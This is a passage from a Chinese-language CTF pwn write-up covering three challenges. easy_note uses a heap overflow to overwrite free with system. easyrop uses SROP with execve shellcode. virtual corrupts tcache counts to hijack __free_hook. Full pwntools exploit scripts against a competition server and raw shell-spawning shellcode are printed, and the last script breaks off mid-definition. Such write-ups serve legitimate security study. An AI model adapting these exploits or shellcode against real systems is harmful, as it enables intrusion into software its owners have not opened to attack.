然后我们通过修改free函数为system，这样在下次调用free的时候，由于在堆块头部的信息就是申请的size大小，这是我们可控的内容，利用类似ret2text的思想，传入sh的16进制内容，成功getshell。
这里还有一种方法，就是利用 **scanf** 函数在申请大于0x400的chunk后，使用完毕会free掉，如果我们让 **scanf**
函数的内容中存在 **sh（类似 ;sh; ）**
。那么也可以达到getshell的目的。但是要注意，scanf调用的free函数，不会走got表，所以要修改__free_hook才能有用。
**EXP**
    from pwn import *
    from LibcSearcher import *
    #r = process('./easy_note')
    r = remote('111.231.70.44', 28008)
    elf = ELF('./easy_note')
    context.log_level = "debug"
    def choice(idx):
        r.sendlineafter(">", str(idx))
    def add(size):
        choice(1)
        r.sendlineafter("size:", str(size))
    def show(idx):
        choice(2)
        r.sendlineafter("index:", str(idx))
    def edit(idx, content='a'):
        choice(3)
        r.sendlineafter("index:", str(idx))
        r.sendlineafter("size:", str(len(content)))
        r.send(content)
    def rw(idx, addr, size, content='None'):
        add(0x18)
        edit(idx, 'a' * 0x18 + p64(0x50))
        show(idx)
        r.recvuntil('a' * 0x18 + p64(0x50))
        canary = u32(r.recv(4))
        edit(idx, 'a' * 0x18 + p64(size) + p64(canary) + p64(addr))
        show(idx)
        if content != 'None':
            edit(idx, content)
    rw(0, elf.got['free'], 0x8)
    free_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    libc = LibcSearcher('free', free_addr)
    libc_base = free_addr - libc.dump('free')
    free_hook_addr = libc_base + libc.dump('__free_hook')
    edit(0,  p64(libc_base + libc.dump('system')))
    add(0x6873)
    r.interactive()
###  easyrop
**SROP模版题**
**（保护全红，栈溢出0x400）**
刚开始的时候路走歪了，没想到 **SROP**
，其实看到这么大栈溢出，应该自然的就知道是SROP了，毕竟良心出题人还是少的，非必须也不会给这么大（相对应的看到很小的栈溢出就想到栈迁移）。
以为是要考察在 **打远程的情况下可以利用fd = 0或1都能利用sys_write来输出内容**
，来泄露栈地址来操作，可惜的是没给libc，这种方法虽然可行，但是概率大概是1/100（大概），也就没有继续尝试下去了，有兴趣的朋友可以看看。
    from pwn import *
    context(os = 'linux', arch = 'amd64', log_level = 'debug')
    #r = process('./easyrop')
    while True:
    try:
    r = remote('111.231.70.44', 28178)
    syscall_addr = 0x4000DB
    main_addr = 0x4000B4
    ret_addr = 0x4000DE
    #gdb.attach(r, "b *0x4000DB")
    r.send('a' * 0x40 + p64(syscall_addr) + p64(1) + p64(main_addr))
    stack = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    stack -= 0x1639
    log.success("stack: " + hex(stack))
    shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    r.send('a' * 0x40 + p64(stack) + (0x400 - 0x40 - 0x8 - len(shell)) / 0x8 * p64(ret_addr) + shell)
    r.send('cat flag')
    #log.success("stack: " + hex(stack))
    r.interactive()
    except:
    pass
之前接触的SROP都是堆题利用setcontext来ROP，也算是少数的接触syscall的SROP吧（虽然这才是正规的SROP），之前博客也有一道SROP的题目，我写了个非预期。
exp没什么好说的，由于有RWX段，我们可以直接写shell，然后跳到那里去执行，不过记得给栈留点地方，不然shellcode用栈的时候会覆盖到一部分内容。
**EXP**
    from pwn import *
    r = process('./easyrop')
    #r = remote('111.231.70.44',28888)
    context.log_level = "debug"
    context.arch = "amd64"
    frame = SigreturnFrame()
    frame.rax = 0 #sys_read
    frame.rdi = 0
    frame.rsi = 0x6000E0
    frame.rdx = 0x200
    frame.rip = 0x4000DC
    frame.rsp = 0x6000E0 + 0x100
    #gdb.attach(r, "b *0x4000DB")
    payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    r.sendafter("Welcome to DJB easyrop!\n", 'a' * 0x40 + p64(0x4000DB) + p64(0xF) + str(frame))
    r.send(payload.ljust(0x100, '\x00') + p64(0x6000E0))
    r.interactive()
###  **virtual**
观察主程序，发现有一个循环接收内容：
逻辑大概是这样的，读入一串code（长度最多为0x100），然后通过handle函数来解析读取的数据内容，这种读入一共只有两次。
**所以不难想到，如果要控制程序命中率100%的话，我们第一次的code必须要leak libc，而第二次就是尝试改相应的其他位置。**
**执行函数分析**
handle函数非常复杂，代码逻辑我根据题目名字猜测是个类似虚拟机的东西，由于伪代码逻辑混乱，故尝试自己把代码进行调整
首先关注到两个亮眼的位置， **malloc和free**
从这里猜测data + 6存放的是指针的信息，而data + 5也是指针信息，data + 4是堆块的结束位置，在free的时候三者都被清空。
在5这个位置，发现可以输出和输入信息，其中的read功能可以用来leak，这也是唯一的leak点。
在4这个为位置，通过第二个传入的内容，会有不同大小的修改内容
在3这个位置，会有不同程度的增加内容
没啥用
在1这个位置，有不同程度的对data + 5指针进行修改，且在修改之前有个检测
在0这个位置，有不同程序的对data + 5的数据进行修改，且修改的内容受到了调控
**漏洞点**
代码中存在的两个检测如下图
**check65写错了，按照我的理解，应该是如果data + 6 > data + 5那么就退出，这就导致了接下来漏洞的发生，程序可以通过减少data +
5来向前溢出。**
**如何利用？**
首先可以观察到一个特征就是，在这个switch中，返回值就代表着这个操作所需的参数长度，且以字节为单位，这可以方便我们编写程序和了解程序流程。
**第一次构造**
我们先考虑第一次的code要如何构造，第一次构造我们需要泄露libc，而我们又有show函数，所以我们要考虑如何绕过tcache，让一个堆块进入到unsorted
bin中，如果要绕过tcache的话，那么意味着我们要让tcache填满，但是对于这道题来说，
**我们一次性最多只能申请一个堆块，如果要申请下一个必须先把这个堆块释放掉。**
所以我们只能考虑如何来一次修改tcache struct中的counts数组对应idx内容大于7。
首先我们可以通过向前溢出一部分距离（受限于最多执行0x100的code），但是溢出的距离不足以来修改到tcache
struct的内容，但是我想到了一个巧妙的方法。
因为data结构实际上也是储存在堆中的，在我们向前溢出的过程中，也可以溢出到那部分的内容，但是我们只能修改一次（因为我们要修改的是 **data + 5**
，而向前溢出的指针也是这个），所以我考虑修改 **data + 5**
的倒数第二个字节，让他减少1，这样就相当于减少了0x100（32个操作，64个字节），在这样的方法下，我们足以碰到counts数组，接下来只需要修改它为
**0xFF** ，那么我们在接下来free的时候就不会进入到tcahce而是进入到unsorted
bin，然后我们再次申请一块在tcache中不存在的堆块，那么就会去unsorted bin中申请，这个申请得到的数据上存在unsorted
bin残留的main_arena指针，我们通过再次申请然后show一下就可以拿到libc上的地址了。
在这之后，我发现距离0x100还有一段空间，于是我决定不浪费这些空间，在第一段payload中干一些第二段的事情。
**第二次构造**
由于有在第一次构造的一些帮忙，在第二次构造的时候，实际上我们使用的空间是大于0x100的。所以我们可以考虑直接往前溢出，直接溢出到 **tcache
struct** ，然后修改某个的内容为 **__free_hook** 的地址，再次申请就可以拿出来 **__free_hook**
的地址了，拿到之后我们把他改成system，再free一次，就可以getshell了。
但是好像还发现一个问题，我们没有在堆块写入system执行内容，解决这个问题非常容易，只需要在 **free_hook –
0x8的地方开始申请地址，那么就它之前0x8字节写入shell的内容即可，后0x8个字节来修改free_hook** 。
**总结**
这道题的难点主要在于要理清程序的结构，合理的调试和清晰的分析。最终才能够构造出巧妙的exp来getshell。个人感觉这道题出的很不错，学到了！。
**PS:这道题虽然是glibc2.27，但其实是新版本的2.27，对于tcache来说增加了key用于检测double
free。建议调试过程中使用2.29来调试，与这个版本几乎没差别。**
**EXP**
    from pwn import *
    from LibcSearcher import *
    context.log_level = "debug"
    def write5(data):
        all = p8(0)
        l = len(data)
        if l == 1:
            all += p8(0x10)
        elif l == 2:
            all += p8(0x20)
        elif l == 4:
            all += p8(0x30)
        elif l == 8:
            all += p8(0x40)
        all += data
        return all
    def sub_helper(l):
        all = p8(1)
        if l == 1:
            all += p8(0x10)
        elif l == 2:
            all += p8(0x20)
        elif l == 4:
            all += p8(0x30)
        elif l == 8:
            all += p8(0x40)
        return all
    def show():
        return p8(5) + p8(2)
    def add(size):